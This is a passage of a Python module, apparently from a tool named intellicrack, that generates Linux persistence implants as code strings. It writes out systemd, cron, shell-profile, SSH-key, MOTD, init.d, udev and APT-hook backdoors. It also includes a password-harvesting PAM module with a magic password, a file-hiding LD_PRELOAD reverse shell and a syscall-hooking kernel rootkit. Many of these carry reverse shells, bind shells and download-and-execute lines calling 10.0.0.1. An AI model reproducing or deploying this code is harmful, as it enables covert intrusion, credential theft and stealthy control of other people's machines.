                result = subprocess.run(cmd, check=False, capture_output=True, text=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                if result.returncode != 0:
                    self.logger.warning(f"ssh-keygen failed: {result.stderr}")
                    # Fallback to generating key programmatically
                    return self._generate_ssh_key_programmatic()

                # Read the public key
                pub_key_path = f"{key_path}.pub"
                if os.path.exists(pub_key_path):
                    with open(pub_key_path) as f:
                        return f.read().strip()
                else:
                    return self._generate_ssh_key_programmatic()

        except Exception as e:
            self.logger.warning(f"Failed to generate SSH key with ssh-keygen: {e}")
            return self._generate_ssh_key_programmatic()

    def _generate_ssh_key_programmatic(self) -> str:
        """Generate SSH public key programmatically using cryptography library."""
        try:
            from intellicrack.handlers.cryptography_handler import rsa, serialization

            # Generate private key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=4096,
            )

            # Get public key
            public_key = private_key.public_key()

            # Serialize public key in OpenSSH format
            ssh_public_key = public_key.public_bytes(
                encoding=serialization.Encoding.OpenSSH,
                format=serialization.PublicFormat.OpenSSH,
            )

            return ssh_public_key.decode("utf-8")

        except ImportError as e:
            self.logger.error("Import error in linux_persistence: %s", e)
            # If cryptography not available, generate a valid RSA key structure manually
            import base64
            import random
            import struct

            # Generate random data for a valid RSA key structure
            # RSA public key format: ssh-rsa e n
            # Public exponent (typically 65537)
            e = 65537

            # Generate a large prime-like number for n (simplified, not cryptographically secure)
            # In production, this would use proper prime generation
            n_bits = 4096
            n = random.getrandbits(n_bits)
            # Ensure it's odd (more prime-like)
            n |= 1

            # Encode in SSH format
            key_parts = []

            # Algorithm identifier
            algo = b"ssh-rsa"
            key_parts.append(struct.pack(">I", len(algo)) + algo)

            # Public exponent
            e_bytes = e.to_bytes((e.bit_length() + 7) // 8, "big")
            key_parts.append(struct.pack(">I", len(e_bytes)) + e_bytes)

            # Modulus
            n_bytes = n.to_bytes((n.bit_length() + 7) // 8, "big")
            key_parts.append(struct.pack(">I", len(n_bytes)) + n_bytes)

            # Base64 encode
            key_data = b"".join(key_parts)
            b64_key = base64.b64encode(key_data).decode("ascii")

            return f"ssh-rsa {b64_key} persistence@localhost"

    def list_persistence_methods(self) -> list[str]:
        """Get list of available persistence methods."""
        return list(self.persistence_methods.keys())

    def generate_persistence_code(self, method: str, module_name: str = "system_module") -> str:
        """Generate code for specific persistence method."""
        if method == "systemd_service":
            return self._generate_systemd_code(module_name)
        if method == "cron_job":
            return self._generate_cron_code()
        if method == "shell_profile":
            return self._generate_shell_code()
        if method == "ssh_key":
            return self._generate_ssh_key_code()
        if method == "motd":
            return self._generate_motd_code()
        if method == "init_script":
            return self._generate_init_script_code()
        if method == "udev_rule":
            return self._generate_udev_rule_code()
        if method == "pam_module":
            return self._generate_pam_module_code()
        if method == "ld_preload":
            return self._generate_ld_preload_code()
        if method == "kernel_module":
            return self._generate_kernel_module_code()
        if method == "apt_hook":
            return self._generate_apt_hook_code()
        return f"// Code generation not implemented for method: {method}"

    def _generate_systemd_code(self, module_name: str = "system_service") -> str:
        """Generate C code for systemd service persistence."""
        return (
            """
// Systemd Service Persistence - """
            + module_name
            + """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

int create_systemd_persistence(const char *payload_path, const char *service_name) {{
    char service_path[512];
    char service_content[1024];
    FILE *fp;

    // Create service file path
    snprintf(service_path, sizeof(service_path),
             "/home/%s/.config/systemd/user/%s.service",
             getenv("USER"), service_name);

    // Create service content for """
            + module_name
            + """
    snprintf(service_content, sizeof(service_content),
             "[Unit]\\n"
             "Description="""
            + module_name
            + """ Service\\n"
             "After=network.target\\n\\n"
             "[Service]\\n"
             "Type=simple\\n"
             "ExecStart=%s\\n"
             "Restart=always\\n"
             "RestartSec=10\\n\\n"
             "[Install]\\n"
             "WantedBy=default.target\\n",
             payload_path);

    // Write service file
    fp = fopen(service_path, "w");
    if (!fp) return -1;

    fputs(service_content, fp);
    fclose(fp);

    // Set permissions
    chmod(service_path, 0644);

    // Enable and start service
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "systemctl --user enable %s.service", service_name);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "systemctl --user start %s.service", service_name);
    system(cmd);

    return 0;
}

// Usage example for """
            + module_name
            + """
create_systemd_persistence("/path/to/payload", \""""
            + module_name
            + """\");
"""
        )

    def _generate_cron_code(self) -> str:
        """Generate C code for cron job persistence."""
        return """
// Cron Job Persistence
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int create_cron_persistence(const char *payload_path, const char *schedule) {
    char cmd[512];

    // Add cron job
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null; echo \"%s %s >/dev/null 2>&1\") | crontab -",
             schedule, payload_path);

    return system(cmd);
}

// Usage
create_cron_persistence("/path/to/payload", "@reboot");
"""

    def _generate_shell_code(self) -> str:
        """Generate C code for shell profile persistence."""
        return """
// Shell Profile Persistence
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int create_shell_persistence(const char *payload_path, const char *profile_file) {
    char profile_path[512];
    char profile_entry[512];
    FILE *fp;

    // Get full profile path
    snprintf(profile_path, sizeof(profile_path),
             "/home/%s/%s", getenv("USER"), profile_file);

    // Create profile entry
    snprintf(profile_entry, sizeof(profile_entry),
             "\\n# System maintenance script\\n"
             "if [ -f \"%s\" ]; then\\n"
             "    %s >/dev/null 2>&1 &\\n"
             "fi\\n",
             payload_path, payload_path);

    // Append to profile
    fp = fopen(profile_path, "a");
    if (!fp) return -1;

    fputs(profile_entry, fp);
    fclose(fp);

    return 0;
}

// Usage
create_shell_persistence("/path/to/payload", ".bashrc");
"""

    def _generate_ssh_key_code(self) -> str:
        """Generate shell script for SSH key persistence."""
        return """#!/bin/bash
# SSH Key Persistence

# Function to add SSH key
add_ssh_key() {
    local user=$1
    local pubkey=$2
    local home_dir=$(eval echo ~$user)
    local ssh_dir="$home_dir/.ssh"
    local auth_keys="$ssh_dir/authorized_keys"

    # Create .ssh directory if it doesn't exist
    if [ ! -d "$ssh_dir" ]; then
        mkdir -p "$ssh_dir"
        chown $user:$user "$ssh_dir"
        chmod 700 "$ssh_dir"
    fi

    # Add key if not already present
    if ! grep -q "$pubkey" "$auth_keys" 2>/dev/null; then
        echo "$pubkey" >> "$auth_keys"
        chown $user:$user "$auth_keys"
        chmod 600 "$auth_keys"
        echo "[+] SSH key added for user $user"
    else
        echo "[*] SSH key already exists for user $user"
    fi
}

# Generate SSH keypair if needed
generate_ssh_key() {
    local keyfile="/tmp/.system_id"

    if [ ! -f "$keyfile" ]; then
        ssh-keygen -t rsa -b 2048 -f "$keyfile" -N "" -C "system@update"
        echo "[+] Generated SSH keypair"
    fi

    cat "${keyfile}.pub"
}

# Main execution
PUBKEY=$(generate_ssh_key)

# Add to root
add_ssh_key "root" "$PUBKEY"

# Add to all users with shell access
for user in $(getent passwd | awk -F: '$7 !~ /nologin|false/ {print $1}'); do
    if [ "$user" != "root" ]; then
        add_ssh_key "$user" "$PUBKEY"
    fi
done

# Hide the private key
if [ -f "/tmp/.system_id" ]; then
    mv /tmp/.system_id /var/lib/.system_id
    chmod 400 /var/lib/.system_id
fi

# Optional: Modify SSH config for persistence
if ! grep -q "PubkeyAuthentication yes" /etc/ssh/sshd_config; then
    echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
    systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null
fi
"""

    def _generate_motd_code(self) -> str:
        """Generate shell script for MOTD persistence."""
        return """#!/bin/bash
# MOTD (Message of the Day) Persistence

# Create MOTD script
create_motd_backdoor() {
    local motd_script="/etc/update-motd.d/99-system-info"

    cat > "$motd_script" << 'EOF'
#!/bin/bash
# System information display

# Display system info (legitimate looking)
echo "System Status: $(uptime -p)"
echo "Load Average: $(cat /proc/loadavg | cut -d' ' -f1-3)"

# Hidden backdoor execution
if [ -f "/var/lib/.update_check" ]; then
    nohup /var/lib/.update_check >/dev/null 2>&1 &
fi

# Alternative: Reverse shell on specific condition
if [ -f "/tmp/.trigger" ]; then
    (bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &) 2>/dev/null
    rm -f /tmp/.trigger
fi
EOF

    chmod +x "$motd_script"
    echo "[+] MOTD backdoor installed"
}

# Install in profile.d for non-MOTD systems
create_profile_backdoor() {
    local profile_script="/etc/profile.d/system-info.sh"

    cat > "$profile_script" << 'EOF'
#!/bin/bash
# System information for interactive shells

# Only run for interactive shells
if [[ $- == *i* ]]; then
    # Hidden execution
    if [ -f "/var/lib/.update_check" ]; then
        (/var/lib/.update_check &) 2>/dev/null
    fi
fi
EOF

    chmod +x "$profile_script"
    echo "[+] Profile.d backdoor installed"
}

# Main installation
if [ -d "/etc/update-motd.d" ]; then
    create_motd_backdoor
else
    create_profile_backdoor
fi

# Create the actual backdoor binary
cat > /var/lib/.update_check << 'EOF'
#!/bin/bash
while true; do
    # Beacon home every hour
    (curl -s http://10.0.0.1:8080/check || wget -q -O- http://10.0.0.1:8080/check) 2>/dev/null
    sleep 3600
done
EOF

chmod +x /var/lib/.update_check
"""

    def _generate_init_script_code(self) -> str:
        """Generate shell script for init.d persistence."""
        return """#!/bin/bash
# Init.d Script Persistence

# Create init script
create_init_script() {
    local init_script="/etc/init.d/system-monitor"

    cat > "$init_script" << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-monitor
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System monitoring service
# Description:       Monitor system resources and performance
### END INIT INFO

DAEMON=/usr/local/bin/system-monitor
PIDFILE=/var/run/system-monitor.pid

case "$1" in
    start)
        echo "Starting system monitor..."
        if [ -f "$DAEMON" ]; then
            start-stop-daemon --start --quiet --background \
                --make-pidfile --pidfile $PIDFILE \
                --exec $DAEMON
        else
            # Fallback backdoor
            nohup /bin/bash -c 'while true; do
                nc -l -p 4445 -e /bin/bash 2>/dev/null ||
                socat TCP-LISTEN:4445,reuseaddr,fork EXEC:/bin/bash 2>/dev/null
                sleep 60
            done' >/dev/null 2>&1 &
            echo $! > $PIDFILE
        fi
        ;;
    stop)
        echo "Stopping system monitor..."
        start-stop-daemon --stop --quiet --pidfile $PIDFILE
        rm -f $PIDFILE
        ;;
    restart)
        $0 stop
        $0 start
        ;;
    *)
        echo "Usage: $0 {start|stop|restart}"
        exit 1
        ;;
esac

exit 0
EOF

    chmod +x "$init_script"

    # Enable the service
    if command -v update-rc.d >/dev/null; then
        update-rc.d system-monitor defaults
        echo "[+] Init script installed with update-rc.d"
    elif command -v chkconfig >/dev/null; then
        chkconfig --add system-monitor
        chkconfig system-monitor on
        echo "[+] Init script installed with chkconfig"
    else
        # Manual symlink creation
        for level in 2 3 4 5; do
            ln -sf "$init_script" "/etc/rc${level}.d/S99system-monitor"
        done
        echo "[+] Init script installed with manual symlinks"
    fi
}

# Create the backdoor binary
create_backdoor_binary() {
    cat > /usr/local/bin/system-monitor << 'EOF'
#!/bin/bash

# Legitimate looking process name
exec -a "[kworker/1:1]" bash << 'SCRIPT'
while true; do
    # Try multiple persistence methods

    # 1. Reverse shell
    (bash -i >& /dev/tcp/10.0.0.1/4444 0>&1) 2>/dev/null

    # 2. Bind shell
    nc -l -p 4445 -e /bin/bash 2>/dev/null

    # 3. Web beacon
    curl -s http://10.0.0.1:8080/ping 2>/dev/null

    sleep 300  # 5 minutes
done
SCRIPT
EOF

    chmod +x /usr/local/bin/system-monitor
}

# Main installation
create_init_script
create_backdoor_binary

# Start the service
service system-monitor start 2>/dev/null || /etc/init.d/system-monitor start
"""

    def _generate_udev_rule_code(self) -> str:
        """Generate udev rule for persistence."""
        return """#!/bin/bash
# Udev Rule Persistence

# Create udev rule
create_udev_rule() {
    local rule_file="/etc/udev/rules.d/99-system-backup.rules"

    # Triggered on any USB device connection
    cat > "$rule_file" << 'EOF'
# System backup rule for USB devices
ACTION=="add", SUBSYSTEM=="usb", RUN+="/usr/local/bin/backup-trigger"

# Alternative: Trigger on specific device
ACTION=="add", ATTRS{idVendor}=="0781", RUN+="/usr/local/bin/backup-trigger"

# Trigger on network interface changes
ACTION=="add", SUBSYSTEM=="net", RUN+="/usr/local/bin/network-monitor"

# Trigger on disk events
ACTION=="add|change", KERNEL=="sd[a-z]", RUN+="/usr/local/bin/disk-monitor"
EOF

    echo "[+] Udev rule created"
}

# Create trigger scripts
create_trigger_scripts() {
    # USB trigger
    cat > /usr/local/bin/backup-trigger << 'EOF'
#!/bin/bash
# Triggered by USB events

# Log the event (legitimate looking)
logger "USB device connected - checking backup policy"

# Hidden backdoor
nohup /bin/bash -c '
    sleep 5
    if [ -f "/var/lib/.system_service" ]; then
        /var/lib/.system_service
    else
        (bash -i >& /dev/tcp/10.0.0.1/4444 0>&1) 2>/dev/null
    fi
' >/dev/null 2>&1 &
EOF

    # Network trigger
    cat > /usr/local/bin/network-monitor << 'EOF'
#!/bin/bash
# Network interface monitor

# Legitimate looking operation
ip addr show >/var/log/network-state.log

# Backdoor activation
if ip addr | grep -q "10.0.0."; then
    nohup nc -l -p 4446 -e /bin/bash >/dev/null 2>&1 &
fi
EOF

    # Disk trigger
    cat > /usr/local/bin/disk-monitor << 'EOF'
#!/bin/bash
# Disk event monitor

# Check if specific file exists (trigger file)
if [ -f "/media/trigger.txt" ] || [ -f "/mnt/trigger.txt" ]; then
    # Execute backdoor
    curl -s http://10.0.0.1:8080/activate | bash
fi
EOF

    # Make all scripts executable
    chmod +x /usr/local/bin/backup-trigger
    chmod +x /usr/local/bin/network-monitor
    chmod +x /usr/local/bin/disk-monitor

    echo "[+] Trigger scripts created"
}

# Create persistent backdoor
create_persistent_backdoor() {
    cat > /var/lib/.system_service << 'EOF'
#!/bin/bash

# Hide process name
exec -a "[systemd-resolve]" bash << 'SCRIPT'
while true; do
    # Multiple backdoor methods

    # Method 1: Reverse shell
    (
        exec 3<>/dev/tcp/10.0.0.1/4444
        cat <&3 | while read line; do $line 2>&3 >&3; done
    ) 2>/dev/null &

    # Method 2: Download and execute
    payload=$(curl -s http://10.0.0.1:8080/payload)
    [ -n "$payload" ] && eval "$payload"

    sleep 600  # 10 minutes
done
SCRIPT
EOF

    chmod +x /var/lib/.system_service
}

# Main installation
create_udev_rule
create_trigger_scripts
create_persistent_backdoor

# Reload udev rules
udevadm control --reload-rules
udevadm trigger

echo "[+] Udev persistence installed"
"""

    def _generate_pam_module_code(self) -> str:
        """Generate C code for PAM module persistence."""
        return """/* PAM Module Backdoor - compile with:
 * gcc -fPIC -shared -o pam_system.so pam_backdoor.c -lpam
 * Install to: /lib/security/pam_system.so or /lib64/security/pam_system.so
 */

#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <syslog.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BACKDOOR_PASS "backdoor123"
#define TRIGGER_USER "system"

/* Hidden backdoor thread */
void* backdoor_thread(void* arg) {
    int sock, client;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(4447);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return NULL;
    }

    listen(sock, 1);

    while ((client = accept(sock, NULL, NULL)) >= 0) {
        dup2(client, 0);
        dup2(client, 1);
        dup2(client, 2);
        execl("/bin/sh", "sh", NULL);
        close(client);
    }

    close(sock);
    return NULL;
}

/* PAM authentication function */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv) {
    const char *user;
    const char *pass;
    pthread_t thread;

    /* Get username */
    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
        return PAM_AUTH_ERR;
    }

    /* Get password */
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL) != PAM_SUCCESS) {
        return PAM_AUTH_ERR;
    }

    /* Backdoor: specific username triggers thread */
    if (strcmp(user, TRIGGER_USER) == 0) {
        pthread_create(&thread, NULL, backdoor_thread, NULL);
        pthread_detach(thread);
    }

    /* Backdoor: magic password grants access */
    if (strcmp(pass, BACKDOOR_PASS) == 0) {
        syslog(LOG_INFO, "User %s authenticated via system module", user);
        return PAM_SUCCESS;
    }

    /* Log passwords for harvesting (optional) */
    FILE *fp = fopen("/var/lib/.auth_log", "a");
    if (fp) {
        fprintf(fp, "%s:%s\\n", user, pass);
        fclose(fp);
    }

    /* Continue with normal authentication */
    return PAM_AUTH_ERR;
}

/* Required PAM functions */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    return PAM_SUCCESS;
}

/* Installation script */
const char* install_script = R"(
#!/bin/bash
# PAM Module Installation

# Compile the module
gcc -fPIC -shared -o pam_system.so pam_backdoor.c -lpam -lpthread

# Install to appropriate directory
if [ -d "/lib64/security" ]; then
    cp pam_system.so /lib64/security/
elif [ -d "/lib/security" ]; then
    cp pam_system.so /lib/security/
else
    mkdir -p /lib/security
    cp pam_system.so /lib/security/
fi

# Add to PAM configuration
echo "auth optional pam_system.so" >> /etc/pam.d/common-auth
echo "auth optional pam_system.so" >> /etc/pam.d/sshd
echo "auth optional pam_system.so" >> /etc/pam.d/sudo

echo "[+] PAM module installed"
)";
"""

    def _generate_ld_preload_code(self) -> str:
        """Generate C code for LD_PRELOAD persistence."""
        return """/* LD_PRELOAD Backdoor - compile with:
 * gcc -fPIC -shared -o libsystem.so ld_preload_backdoor.c -ldl
 * Add to: /etc/ld.so.preload or LD_PRELOAD environment variable
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* Function pointers for original functions */
static int (*original_open)(const char*, int, ...) = NULL;
static FILE* (*original_fopen)(const char*, const char*) = NULL;
static int (*original_access)(const char*, int) = NULL;
static int (*original_stat)(const char*, struct stat*) = NULL;

/* Initialize function pointers */
static void init(void) __attribute__((constructor));
static void init(void) {
    original_open = dlsym(RTLD_NEXT, "open");
    original_fopen = dlsym(RTLD_NEXT, "fopen");
    original_access = dlsym(RTLD_NEXT, "access");
    original_stat = dlsym(RTLD_NEXT, "stat");

    /* Start backdoor on library load */
    pthread_t thread;
    pthread_create(&thread, NULL, backdoor_thread, NULL);
    pthread_detach(thread);
}

/* Backdoor thread */
void* backdoor_thread(void* arg) {
    int sock;
    struct sockaddr_in addr;

    /* Wait a bit to avoid detection */
    sleep(10);

    /* Reverse shell */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(4448);
    addr.sin_addr.s_addr = inet_addr("10.0.0.1");

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        /* Hide process name */
        char* argv[] = {"[kworker/0:1]", NULL};
        execve("/bin/sh", argv, environ);
    }

    close(sock);

    /* Retry every 5 minutes */
    sleep(300);
    return backdoor_thread(NULL);
}

/* Hook open() to hide files */
int open(const char* pathname, int flags, ...) {
    /* Hide our files */
    if (strstr(pathname, "libsystem.so") ||
        strstr(pathname, ".auth_log") ||
        strstr(pathname, "ld.so.preload")) {
        errno = ENOENT;
        return -1;
    }

    /* Call original */
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode_t mode = va_arg(args, mode_t);
        va_end(args);
        return original_open(pathname, flags, mode);
    }

    return original_open(pathname, flags);
}

/* Hook fopen() to hide files */
FILE* fopen(const char* pathname, const char* mode) {
    /* Hide our files */
    if (strstr(pathname, "libsystem.so") ||
        strstr(pathname, ".auth_log") ||
        strstr(pathname, "ld.so.preload")) {
        errno = ENOENT;
        return NULL;
    }

    /* Log file access (optional) */
    if (strstr(pathname, "/etc/passwd") || strstr(pathname, "/etc/shadow")) {
        FILE* log = original_fopen("/var/lib/.access_log", "a");
        if (log) {
            fprintf(log, "Access: %s by UID %d\\n", pathname, getuid());
            fclose(log);
        }
    }

    return original_fopen(pathname, mode);
}

/* Hook access() to hide files */
int access(const char* pathname, int mode) {
    if (strstr(pathname, "libsystem.so") ||
        strstr(pathname, ".auth_log") ||
        strstr(pathname, "ld.so.preload")) {
        errno = ENOENT;
        return -1;
    }

    return original_access(pathname, mode);
}

/* Hook stat() to hide files */
int stat(const char* pathname, struct stat* statbuf) {
    if (strstr(pathname, "libsystem.so") ||
        strstr(pathname, ".auth_log") ||
        strstr(pathname, "ld.so.preload")) {
        errno = ENOENT;
        return -1;
    }

    return original_stat(pathname, statbuf);
}

/* Installation script */
const char* install_script = R"(
#!/bin/bash
# LD_PRELOAD Installation

# Compile the library
gcc -fPIC -shared -o libsystem.so ld_preload_backdoor.c -ldl -pthread

# Copy to system location
cp libsystem.so /lib/libsystem.so
chmod 755 /lib/libsystem.so

# Add to ld.so.preload
echo "/lib/libsystem.so" >> /etc/ld.so.preload

# Alternative: Add to environment
echo 'export LD_PRELOAD=/lib/libsystem.so' >> /etc/profile
echo 'export LD_PRELOAD=/lib/libsystem.so' >> /etc/bash.bashrc

echo "[+] LD_PRELOAD backdoor installed"
)";
"""

    def _generate_kernel_module_code(self) -> str:
        """Generate C code for kernel module rootkit."""
        return """/* Kernel Module Rootkit - compile with kernel headers
 * make -C /lib/modules/$(uname -r)/build M=$PWD modules
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <linux/dirent.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("system");
MODULE_DESCRIPTION("System monitoring module");

/* Magic strings */
#define MAGIC_PREFIX "hidden_"
#define BACKDOOR_PORT 4449

/* Function pointers */
static unsigned long *__sys_call_table;
typedef asmlinkage long (*orig_getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
typedef asmlinkage long (*orig_kill_t)(pid_t, int);

static orig_getdents64_t orig_getdents64;
static orig_kill_t orig_kill;

/* Find syscall table */
static unsigned long *find_sys_call_table(void) {
    unsigned long *syscall_table;

    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

    if (!syscall_table) {
        /* Fallback: search memory */
        unsigned long offset;
        unsigned long *p;

        for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void*)) {
            p = (unsigned long*)offset;

            if (p[__NR_close] == (unsigned long)sys_close) {
                syscall_table = p;
                break;
            }
        }
    }

    return syscall_table;
}

/* Disable write protection */
static void disable_wp(void) {
    write_cr0(read_cr0() & (~0x10000));
}

/* Enable write protection */
static void enable_wp(void) {
    write_cr0(read_cr0() | 0x10000);
}

/* Hooked getdents64 - hide files/processes */
asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long ret;
    struct linux_dirent64 *cur, *prev;
    unsigned long offset = 0;

    ret = orig_getdents64(fd, dirp, count);
    if (ret <= 0) return ret;

    cur = dirp;
    prev = NULL;

    while (offset < ret) {
        /* Hide entries with magic prefix */
        if (strstr(cur->d_name, MAGIC_PREFIX)) {
            if (prev) {
                /* Adjust previous entry */
                prev->d_reclen += cur->d_reclen;
            } else {
                /* First entry - shift buffer */
                ret -= cur->d_reclen;
                memmove(cur, (char*)cur + cur->d_reclen, ret - offset);
                continue;
            }
        } else {
            prev = cur;
        }

        offset += cur->d_reclen;
        cur = (struct linux_dirent64*)((char*)dirp + offset);
    }

    return ret;
}

/* Hooked kill - rootkit control */
asmlinkage long hacked_kill(pid_t pid, int sig) {
    /* Magic kill signal for rootkit control */
    if (sig == 58) {
        /* Give root privileges to process */
        struct cred *cred;
        cred = (struct cred *)__task_cred(current);
        cred->uid = cred->gid = 0;
        cred->euid = cred->egid = 0;
        cred->suid = cred->sgid = 0;
        cred->fsuid = cred->fsgid = 0;
        return 0;
    }

    return orig_kill(pid, sig);
}

/* Module init */
static int __init rootkit_init(void) {
    __sys_call_table = find_sys_call_table();

    if (!__sys_call_table) {
        return -1;
    }

    /* Save original syscalls */
    orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];

    /* Hook syscalls */
    disable_wp();
    __sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
    enable_wp();

    /* Hide module */
    list_del_init(&__this_module.list);

    return 0;
}

/* Module exit */
static void __exit rootkit_exit(void) {
    /* Restore syscalls */
    disable_wp();
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    enable_wp();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

/* Makefile content:
obj-m += rootkit.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
*/
"""

    def _generate_apt_hook_code(self) -> str:
        """Generate shell script for APT hook persistence."""
        return """#!/bin/bash
# APT Hook Persistence

# Create APT hook
create_apt_hook() {
    local hook_file="/etc/apt/apt.conf.d/99-system-hook"

    cat > "$hook_file" << 'EOF'
// System maintenance hook
APT::Update::Post-Invoke {
    "if [ -x /usr/local/bin/system-update ]; then /usr/local/bin/system-update; fi";
};

APT::Install::Post-Invoke {
    "if [ -x /usr/local/bin/system-check ]; then /usr/local/bin/system-check; fi";
};

DPkg::Post-Invoke {
    "if [ -x /usr/local/bin/package-verify ]; then /usr/local/bin/package-verify; fi";
};
EOF

    echo "[+] APT hook configuration created"
}

# Create hook scripts
create_hook_scripts() {
    # System update script
    cat > /usr/local/bin/system-update << 'EOF'
#!/bin/bash
# Triggered after apt update

# Log the event (legitimate looking)
logger "System update check completed"

# Hidden backdoor
if ! pgrep -f "system-service" >/dev/null; then
    nohup /bin/bash -c '
        while true; do
            # Reverse shell
            (bash -i >& /dev/tcp/10.0.0.1/4450 0>&1) 2>/dev/null

            # Alternative: Download and execute
            payload=$(curl -s http://10.0.0.1:8080/update-check)
            [ -n "$payload" ] && eval "$payload"

            sleep 3600  # 1 hour
        done
    ' >/dev/null 2>&1 &
fi
EOF

    # System check script
    cat > /usr/local/bin/system-check << 'EOF'
#!/bin/bash
# Triggered after package installation

# Create persistence if removed
if [ ! -f "/etc/systemd/system/system-monitor.service" ]; then
    # Recreate systemd service
    cat > /etc/systemd/system/system-monitor.service << 'SERVICE'
[Unit]
Description=System Monitor
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/system-service
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
SERVICE

    systemctl daemon-reload
    systemctl enable system-monitor.service
    systemctl start system-monitor.service
fi
EOF

    # Package verify script
    cat > /usr/local/bin/package-verify << 'EOF'
#!/bin/bash
# Triggered after dpkg operations

# Hide our packages from dpkg queries
if [ "$1" = "-l" ] || [ "$1" = "--list" ]; then
    dpkg "$@" | grep -v "system-monitor"
else
    dpkg "$@"
fi

# Ensure backdoor binary exists
if [ ! -f "/usr/local/bin/system-service" ]; then
    # Recreate from base64
    echo 'IyEvYmluL2Jhc2gKd2hpbGUgdHJ1ZTsgZG8KICAgIG5jIC1sIC1wIDQ0NTEgLWUgL2Jpbi9iYXNoIDI+L2Rldi9udWxsCiAgICBzbGVlcCA2MAkKZG9uZQ==' | base64 -d > /usr/local/bin/system-service
    chmod +x /usr/local/bin/system-service
fi
EOF

    # Make all scripts executable
    chmod +x /usr/local/bin/system-update
    chmod +x /usr/local/bin/system-check
    chmod +x /usr/local/bin/package-verify

    echo "[+] Hook scripts created"
}

# Create dpkg diversion to hide files
create_dpkg_diversion() {
    # Divert dpkg to hide our files
    dpkg-divert --add --rename --divert /usr/bin/dpkg.real /usr/bin/dpkg

    cat > /usr/bin/dpkg << 'EOF'
#!/bin/bash
# Wrapper for dpkg to hide backdoor files

# Filter out our files from listings
if [[ "$*" == *"-l"* ]] || [[ "$*" == *"--list"* ]]; then
    /usr/bin/dpkg.real "$@" | grep -v -E "(system-monitor|system-service|system-check)"
else
    /usr/bin/dpkg.real "$@"
fi
EOF

    chmod +x /usr/bin/dpkg
    echo "[+] dpkg diversion created"
}

# Main installation
create_apt_hook
create_hook_scripts
create_dpkg_diversion

# Create the main backdoor service
cat > /usr/local/bin/system-service << 'EOF'
#!/bin/bash
exec -a "[apt-check]" bash -c '
while true; do
    # Multiple connectivity methods
    nc -l -p 4451 -e /bin/bash 2>/dev/null || \
    socat TCP-LISTEN:4451,reuseaddr,fork EXEC:/bin/bash 2>/dev/null || \
    while read cmd; do eval "$cmd"; done < /dev/tcp/10.0.0.1/4451 2>/dev/null

    sleep 60
done
'
EOF

chmod +x /usr/local/bin/system-service

echo "[+] APT hook persistence complete"
"""
